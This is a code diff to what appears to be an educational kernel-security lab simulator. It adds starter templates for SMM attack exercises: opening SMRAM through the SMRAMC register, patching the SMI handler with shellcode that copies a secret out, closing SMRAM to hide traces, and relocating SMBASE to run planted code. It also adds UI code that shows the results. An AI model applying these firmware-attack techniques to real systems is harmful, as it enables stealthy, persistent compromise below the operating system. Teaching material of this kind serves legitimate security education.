@@ -67,6 +67,132 @@ NTSTATUS DriverEntry(
 }
 `;
   }
+
+  if (lab.id.includes("smm-vault")) {
+    return `// SMM vault: open SMRAM from ring 0, patch the SMI handler, and make
+// ring -2 exfiltrate the secret into your landing page.
+//
+// Chipset facts (Q35-style, device 0:0:0):
+//   SMRAMC lives at config offset 0x9c (dword lane; the SMRAMC byte).
+//   Bits: [3]=D_OPEN [2]=D_CLS [1]=D_LCK [0]=G_SMRAME
+//   TSEG (SMRAM) = 0x7f000000..0x7f7fffff, SMBASE default 0x7f300000,
+//   SMI handler entry = SMBASE + 0x8000.
+// APMC port 0xB2: writing 0x01 latches an SMI. The lab dispatches it for
+// you after DriverEntry returns.
+
+#include <ntddk.h>
+
+static __inline void outbyte(unsigned short Port, unsigned char Value) {
+    __asm__ volatile ("outb %0, %1" :: "a"(Value), "Nd"(Port));
+}
+
+#define PCI_CFG_ADDR 0xCF8
+#define PCI_CFG_DATA 0xCFC
+#define APMC_PORT    0xB2
+
+#define SMRAMC_REG   0x9c
+#define TSEG_BASE    0x7f300000u          /* SMBASE inside TSEG */
+#define HANDLER_OFF  0x8000               /* SMBASE + 0x8000 */
+
+/* landing page the lab watches after the SMI fires */
+#define LANDING      ((unsigned char*)0xffffe00010000000ULL)
+
+/* The firmware handler we plant: copy 16 bytes of the secret at
+ * SMBASE+0x1000 into RCX's saved value... too clever. Instead it copies
+ * from a FIXED address you choose below straight into LANDING. */
+#define SECRET_VA    (TSEG_BASE + 0x1000)
+
+static const unsigned char HANDLER_PATCH[] = {
+    /* movabs rsi, SECRET_VA ; movabs rdi, LANDING ; mov ecx,16 ; rep movsb ; ret
+       (the two imm64s below are pre-filled for the default TSEG/LANDING) */
+    0x48, 0xBE, 0x00, 0x00, 0x30, 0x7F, 0x00, 0x00, 0x00, 0x00, // movabs rsi, SECRET_VA
+    0x48, 0xBF, 0x00, 0x00, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, // movabs rdi, LANDING
+    0xB9, 0x10, 0x00, 0x00, 0x00,                               // mov ecx, 16
+    0xF3, 0xA4,                                                 // rep movsb
+    0xC3,
+};
+
+void PatchSmram(void) {
+    // 1) program CF8 with (ENABLE_BIT | (0<<16) | (0<<11) | (0<<8) | SMRAMC_REG)
+    unsigned int addr = 0x80000000u | SMRAMC_REG;
+    // TODO: write 'addr' to PCI_CFG_ADDR and then write 0x09 (D_OPEN|G_SMRAME)
+    //       to PCI_CFG_DATA to OPEN the vault.
+
+    // 2) while open: overwrite the handler page at TSEG_BASE+HANDLER_OFF
+    //      with HANDLER_PATCH (fix its movsb encoding first!)
+
+    // 3) close it again: rewrite SMRAMC with 0x01 to cover your tracks.
+}
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    PatchSmram();
+    outbyte(APMC_PORT, 0x01);   // fire!
+    DbgPrint("SMM-VAULT: latch set\\n");
+    return STATUS_SUCCESS;
+}
+`;
+  }
+
+  if (lab.id.includes("smm-reloc")) {
+    return `// SMBASE relocation: your patched SMI handler rewrites the save-state's
+// SMBASE field BEFORE RSM, so the NEXT SMI enters code you planted.
+//
+// Canonical anchor: the x64 SMRAM save-state stores SMBASE at offset
+// 0xFB04 from the (old) SMBASE — SDM Vol.3 ch.34. Handler entry is
+// SMBASE+0x8000. TSEG spans 0x7f000000..0x7f7fffff.
+//
+// Pick NEW_BASE anywhere free inside TSEG. Plant this stub at
+// NEW_BASE+0x8000:
+//     movabs rax, LANDING2 ; mov dword [rax], 0x4B46324D ('MF2K') ; ret
+// Then patch the CURRENT handler to: store NEW_BASE into old+0xFB04 ; ret
+
+#include <ntddk.h>
+
+static __inline void outbyte(unsigned short Port, unsigned char Value) {
+    __asm__ volatile ("outb %0, %1" :: "a"(Value), "Nd"(Port));
+}
+
+#define PCI_CFG_ADDR 0xCF8
+#define PCI_CFG_DATA 0xCFC
+#define APMC_PORT    0xB2
+#define SMRAMC_REG   0x9c
+
+#define OLD_BASE     0x7f300000u
+#define NEW_BASE     0x0u        /* TODO: choose an aligned base inside TSEG */
+#define SAVE_SMBASE_OFF 0x0u     /* TODO: canonical save-state offset */
+#define LANDING2     ((unsigned int*)0xffffe00020000000ULL)
+
+NTSTATUS DriverEntry(
+    _In_ PDRIVER_OBJECT  DriverObject,
+    _In_ PUNICODE_STRING RegistryPath)
+{
+    UNREFERENCED_PARAMETER(DriverObject);
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    unsigned int addr = 0x80000000u | SMRAMC_REG;
+    // TODO: open SMRAM (D_OPEN|G_SMRAME) via CF8/CFC like last module...
+
+    // TODO: plant the stub at NEW_BASE+0x8000:
+    //   bytes: 48 B8 <landing2 imm64> C7 00 4D 32 46 4B C3
+    //          ("movabs rax,imm64; mov dword [rax],'MF2K'; ret")
+
+    // TODO: patch the OLD handler at OLD_BASE+0x8000:
+    //   bytes: C7 05 <rel32=SAVE_SMBASE_OFF-...> or simpler absolute:
+    //   48 B8 <abs=OLD_BASE+SAVE_SMBASE_OFF> ; B8/BA? keep simple:
+    //   C7 40 04 ... nope — use: mov dword [abs],NEW_BASE via
+    //   48 B8<abs> ; B8<new> hmm — full working bytes are in the lesson!
+
+    // TODO: close SMRAM, latch SMI (0xB2). The lab runs TWO SMIs for you.
+    return STATUS_SUCCESS;
+}
+`;
+  }
   return "// Write your driver code here\n";
 }
 
@@ -429,6 +555,30 @@ function renderLesson(lesson) {
             status("warn", `${ex.handled ? "SEH handled" : "UNHANDLED"} @ ${ex.faultRip}: ${ex.detail}`);
           }
           return;
+        }
+
+        // SMM labs: a driver can latch an SMI (port 0xB2). Dispatch the
+        // modeled interrupt now and surface the handler's effects.
+        if (currentKernel.smm?.smiPending) {
+          const smm = currentKernel.smm;
+          let guard = 0;
+          while (smm.smiPending && guard++ < 2) {
+            const r2 = smm.smiDispatch();
+            compileStatus.append(h("div", { class: r2.status === "ok" ? "good" : "err" },
+              `SMI #${guard}: handler ${r2.status}${r2.retval !== undefined ? ` retval=0x${r2.retval.toString(16)}` : ""}`));
+            for (const line of smm.trace.slice(-4)) {
+              compileStatus.append(h("div", { class: "mono dim" }, line));
+            }
+          }
+          for (const landingVa of [currentKernel.smmLanding, currentKernel.smmLanding2]) {
+            if (!landingVa) continue;
+            const bytes = currentKernel.mem.read(landingVa, 16);
+            const hex = [...bytes].map((b2) => b2.toString(16).padStart(2, "0")).join(" ");
+            const ascii = [...bytes].map((b2) => (b2 >= 0x20 && b2 < 0x7f ? String.fromCharCode(b2) : ".")).join("");
+            compileStatus.append(h("div", { class: "mono" },
+              `landing @ 0x${landingVa.toString(16)}: ${hex}  |${ascii}|`));
+          }
+          currentDebugger.write("SMI dispatched — run !smram / !smmc to inspect SMRAM state.");
         }
         currentDebugger.write(`${loaded.name}: DriverEntry executed on ${backendSel.value} backend.`);
 
